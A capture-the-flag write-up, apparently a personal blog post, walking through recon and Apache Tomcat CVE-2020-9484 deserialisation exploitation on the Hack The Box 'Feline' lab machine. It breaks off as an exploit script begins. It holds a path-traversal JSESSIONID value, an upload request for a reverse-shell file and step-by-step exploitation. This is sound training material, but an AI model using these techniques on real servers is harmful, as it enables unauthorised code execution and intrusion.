<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- iOS Safari -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
  <meta name="theme-color" content="#FFFFFF">
  <meta property="og:title" content="Feline - 10.10.10.205">
  
  <meta name="description" content="Hard-difficulty Linux box on exploiting Apache Tomcat CVE-2020-9484 and abusing docker.sock exposure.">
  <meta property="og:description" content="Hard-difficulty Linux box on exploiting Apache Tomcat CVE-2020-9484 and abusing docker.sock exposure.">
  
  <meta property="og:type" content="blog">
  <title>Feline - 10.10.10.205</title>
  <!-- Favicon -->
  
  <link rel="shortcut icon" href="https://samillwong.github.io/images/profile.jpg">
  
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
  <link rel="stylesheet" type="text/css"
    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
  <link rel="stylesheet" type="text/css" href="css/notablog.css">
  <link rel="stylesheet" type="text/css" href="css/theme.css">
  <style>
    :root {
      font-size: 18px;
    }

    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
    <a href="/">
      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://samillwong.github.io/images/profile.jpg"></span> <span>Home</span></div>
    </a>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
  </nav>
  <header class="Header">
      
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
    <div class="Header__Icon"><span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/1841efd90078820d7ddee432715f339d.png"></span></div>
    
    <h1 class="Header__Title">Feline - 10.10.10.205</h1>
        
    <div class="DateTagBar">
          
      <span class="DateTagBar__Item DateTagBar__Date">Posted on Tue, Mar 2, 2021</span>
          
          
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
          <a href="tag/Hard">Hard</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
          <a href="tag/Linux">Linux</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
          <a href="tag/Insecure_Deserialisation">Insecure_Deserialisation</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
          <a href="tag/SaltStack_Salt">SaltStack_Salt</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--purple">
          <a href="tag/Docker">Docker</a>
      </span>
      
    </div>
    <div class="Article__Desc">
        Hard-difficulty Linux box on exploiting Apache Tomcat CVE-2020-9484 and abusing docker.sock exposure.
    </div>
        
  </header>
      <article id="https://www.notion.so/848ef735d8e44123b80324fddb20566d" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/d0b55e47847b41499a180f3ad7f2601b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/d0b55e47847b41499a180f3ad7f2601b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/7f44d36cd6444f979c357f72f30d3246" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/78aceff1f8654fd4bafad69a6e6b14a7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.205 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/4d8fcf3557da4cbbae9da22e347296a2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy</span></span></span></code></pre></li><li id="https://www.notion.so/30822672461741a68e2fa4567121acf9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/e65276625d374c12a81778a72ee78da1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -sC -sV -p 22,8080 10.10.10.205 &gt; targeted.nmap</code></span></span></p></div><pre id="https://www.notion.so/4de794ed39654447bb5f84d7fb605fae" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.27
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></span></code></pre><div id="https://www.notion.so/74a7a1b926a742b3ab3e1a35b35abd76" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">OpenSSH 8.2p1 Ubuntu 4, Apache Tomcat 9.0.27.</span></span></p></div></li></ul><h2 id="https://www.notion.so/bd8d1dd869cd4efcbf5ccfd6bf53a5b4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/bd8d1dd869cd4efcbf5ccfd6bf53a5b4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration</span></span></h2><div id="https://www.notion.so/e2051b6a320f499791e08f5e3138fd68" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HTTP Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/481f701595984659850f39bb23c54cf2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">A website named &quot;VirusBucket&quot; hosted on port 8080, which seems to be a malware analysis platform, currently closed to public.</span></span></li><li id="https://www.notion.so/9db9b30ae68e45cf88d8f748cf08178f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Service in beta testing is accepting malware sample for analysis, submission page at </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.10.205:8080/service/">http://10.10.10.205:8080/service/</a></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/6299af15080f445887583090a1d2dbb7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Scanning for files with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dirbuster</code></span><span class="SemanticString">, found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/service/script.js</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/970cab30eb3a4356a0444fc5462f669d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#uploadButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#uploadFile"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  ImageUpload<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> ImageUpload <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token function-variable function">init</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#uploadFile"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        ImageUpload<span class="token punctuation">.</span><span class="token function">readURL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">readURL</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span>files <span class="token operator">&amp;&amp;</span> input<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">/*
          $('.header').css(
              "background-image",
              "url(" + e.target.result + ")"
            );
          $(".clipped").css(
            "background-image",
            "url(" + e.target.result + ")"
          ); */</span>
        <span class="token punctuation">}</span>
        reader<span class="token punctuation">.</span><span class="token function">readAsDataURL</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> photo <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"uploadFile"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> email <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
  <span class="token keyword">let</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"image"</span><span class="token punctuation">,</span> photo<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/upload.jsp?email='</span> <span class="token operator">+</span> email <span class="token punctuation">,</span> <span class="token punctuation">{</span> method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span> body<span class="token operator">:</span> formData<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token operator">=></span>response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token operator">=></span><span class="token punctuation">{</span>
	    <span class="token keyword">if</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"successfully"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">"Upload successful! The report will be sent via e-mail."</span><span class="token punctuation">;</span>
	    <span class="token punctuation">}</span>
	    <span class="token keyword">else</span> <span class="token punctuation">{</span>
		    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>
	    <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span></span></span></span></code></pre></li><li id="https://www.notion.so/6fcb28f3b86f4c2f9ac8a2b8caf47738" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Intercepting analyse POST request with Burp Suite:</span></span><pre id="https://www.notion.so/70334c4afe2c490d832f073f913bb2d0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>POST /upload.jsp?email=samiko@htb.me HTTP/1.1
Host: 10.10.10.205:8080
Content-Length: 5680
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMGvQ3BrqXzqkF9bp
Accept: */*
Origin: http://10.10.10.205:8080
Referer: http://10.10.10.205:8080/service/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: JSESSIONID=67893B77AA0369EBAA79816D4FA4E316
Connection: close

------WebKitFormBoundaryMGvQ3BrqXzqkF9bp
Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;reverse.php&quot;
Content-Type: application/x-php

&lt;?php
...
?&gt;

------WebKitFormBoundaryiNLEBpn1fxkcqa6S--</span></span></span></code></pre></li><li id="https://www.notion.so/bf9fbd118f6c427ea096b48f2ad183e2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looking at the response and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">script.js</code></span><span class="SemanticString">, we see that the upload function is expecting an image file:</span></span><pre id="https://www.notion.so/3a8071a0d7244ccb8e4a52696511449e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;reverse.php&quot;
Content-Type: application/x-php</span></span></span></code></pre><pre id="https://www.notion.so/3ea4fd24e0ef4c2e9a3e8977f68a92c9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"image"</span><span class="token punctuation">,</span> photo<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span></code></pre></li><li id="https://www.notion.so/ae71c6cff1974917ab8b2ce64812459f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Upon submitting a sufficiently large image, we get a Java error:</span></span><pre id="https://www.notion.so/bf8f07c98d70404c863079b29cad346a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>org.apache.commons.fileupload.FileUploadBase$IOFileUploadException: Processing of multipart/form-data request failed.
  /opt/tomcat/temp/upload_ef4835ae_2996_473d_b415_5cd220815631_00000026.tmp (Permission denied)</span></span></span></code></pre></li><li id="https://www.notion.so/8c25a698800d4a81afc447662cdc9c82" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Upon sending a request with the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">filename</code></span><span class="SemanticString"> parameter as blank, we get another error:</span></span><pre id="https://www.notion.so/cb633dcf2491470aa93235db560d622a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>java.io.FileNotFoundException: /opt/samples/uploads (Is a directory)</span></span></span></code></pre></li><li id="https://www.notion.so/48b136219663484bb9dc43398dc82dae" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Path to file uploads on the remote filesystem exposed:</span></span><div id="https://www.notion.so/8a062bd9289d4ac5ad7ef3a185034fb5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/samples/uploads</code></span></span></p></div></li><li id="https://www.notion.so/1ee78a7ebe914fb8a0683604349c6d7a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">From these two error messages, we see that Tomcat first writes the data stream to a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.tmp</code></span><span class="SemanticString"> file in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/tomcat/temp/</code></span><span class="SemanticString"> directory under a temporary name. However, if the file upload exceeds the size limit set in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">web.xml</code></span><span class="SemanticString">, the upload is cancelled and returns an error.</span></span></li><li id="https://www.notion.so/d55f492f2dc94f249d383aa2533f0ee0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">If the upload was successful, the file is then moved to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/samples/uploads</code></span><span class="SemanticString"> and stored there.</span></span></li><li id="https://www.notion.so/a354e9b3c3184c3f8dc20343903bb087" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">After some searching, it seems that Apache Tomcat 9.0.27 is in fact outdated, and is vulnerable to RCE by deserialisation under CVE-2020-9484.</span></span></li><li id="https://www.notion.so/f2e16504f48f4f48a452af2daa918a99" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">There are a number of prerequisites for CVE-2020-9484 to be exploitable:</span></span><ol class="NumberedListWrapper"><li id="https://www.notion.so/fa0a84d7f9ce47d1a0b2002ed16a3f31" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PersistentManager</code></span><span class="SemanticString"> is enabled and it’s using a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">FileStore</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/445260f4a2b04d12b140547ec25e080d" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded.</span></span></li><li id="https://www.notion.so/e2bb937d8e284fa28cb3a6478394ee3e" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">There are gadgets in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">classpath</code></span><span class="SemanticString"> that can be used for a Java deserialization attack.</span></span></li></ol></li><li id="https://www.notion.so/90fc8dc523e240d29bd855df7cf7b099" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We know we can upload arbitrary files by making a POST request to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.10.205/upload.jsp">http://10.10.10.205/upload.jsp</a></span></span></li><li id="https://www.notion.so/4d3f19fad9fa42e3a0f1f5f8770f10bf" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can assume that there are gadgets that we can abuse, and that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PersistentManager</code></span><span class="SemanticString"> is enabled from the cookie:</span></span><pre id="https://www.notion.so/6eeaf931b5bc4156a5a08a849607f02e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Cookie: JSESSIONID=67893B77AA0369EBAA79816D4FA4E316</span></span></span></code></pre></li></ul><h2 id="https://www.notion.so/6770474b1af641079b30e8506f0ab872" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/6770474b1af641079b30e8506f0ab872"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/5a71c762500e472ba4522939a99d8cc7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">When Tomcat receives a HTTP request with a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">JSESSIONID</code></span><span class="SemanticString"> cookie, it will ask the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Manager</code></span><span class="SemanticString"> to check if this session already exists.</span></span></li><li id="https://www.notion.so/bb15be916b29434ca79419bbeb731fcd" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The attacker can control the value of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">JSESSIONID</code></span><span class="SemanticString"> sent in the request, but this value is not sanitised and relative paths are accepted.</span></span></li><li id="https://www.notion.so/ca3e753cba464db09309d37e6fc11fac" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This means we can put in something like </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">JSESSIONID=../../../../../../opt/samples/uploads/payload</code></span><span class="SemanticString">, and trick the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Manager</code></span><span class="SemanticString"> into deserialising arbitrary files that we uploaded.</span></span></li><li id="https://www.notion.so/b5e320931d7a40bda5ab497684921c7c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The exploitation process goes as follows:</span></span><ol class="NumberedListWrapper"><li id="https://www.notion.so/73f744e7d26b4f69affda1fdf4b9f3c6" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Serialise the payload with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ysoserial</code></span><span class="SemanticString">, and output the payload as a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.session</code></span><span class="SemanticString"> file.</span></span></li><li id="https://www.notion.so/7a4262b80c1b43d78c754ae0f76ccf6f" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">Upload the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.session</code></span><span class="SemanticString"> file through </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.10.205:8080/upload.jsp">http://10.10.10.205:8080/upload.jsp</a></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/24b45b7ce96c4db1b0415f424871dc71" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">Send a POST request with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">JSESSIONID</code></span><span class="SemanticString"> of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">../../../../../../opt/samples/uploads/payload</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/02c4ce0bc28d4ba5ae7b8ca730542c3f" class="NumberedList" value="4"><span class="SemanticStringArray"><span class="SemanticString">Tomcat will then requests the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Manager</code></span><span class="SemanticString"> to check if a session with ID </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">../../../../../../opt/samples/uploads/payload</code></span><span class="SemanticString"> exists.</span></span></li><li id="https://www.notion.so/8a9c663fc7e74e6591d14c8be5e17442" class="NumberedList" value="5"><span class="SemanticStringArray"><span class="SemanticString">It will first check if it has that session in memory, but we know that it does not.</span></span></li><li id="https://www.notion.so/5b96feddb7ff48f4b1241bc1319f625b" class="NumberedList" value="6"><span class="SemanticStringArray"><span class="SemanticString">If the currently running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Manager</code></span><span class="SemanticString"> is a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PersistentManager</code></span><span class="SemanticString">, it will also check if a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.session</code></span><span class="SemanticString"> file associated to that ID is on the disk.</span></span></li><li id="https://www.notion.so/5f30a038d23b46ffb61252da247e40b2" class="NumberedList" value="7"><span class="SemanticStringArray"><span class="SemanticString">It will check at location: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">directory</code></span><span class="SemanticString"> + </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sessionid</code></span><span class="SemanticString"> + </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.session</code></span><span class="SemanticString">, which evaluates to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">./session/../../../../../../opt/samples/uploads/payload.session</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/330c2eff8e174fe2b369ebb56921241b" class="NumberedList" value="8"><span class="SemanticStringArray"><span class="SemanticString">If the file exists, it will deserialize it and parse the session information from it, granting us arbitrary code execution.</span></span></li></ol></li><li id="https://www.notion.so/62e97af5b36a409588dbefe6ad14c9fb" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ysoserial.jar</code></span><span class="SemanticString"> from </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">JitPack</a></span><span class="SemanticString">, this will be used for serialising our reverse shell payload.</span></span></li><li id="https://www.notion.so/b62c5efc9d3645b885949d3cece61021" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Creating </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">exploit.sh</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/cf9726072fec4939902708e8cffaa183" class="Code Code--NoWrap"><code><span 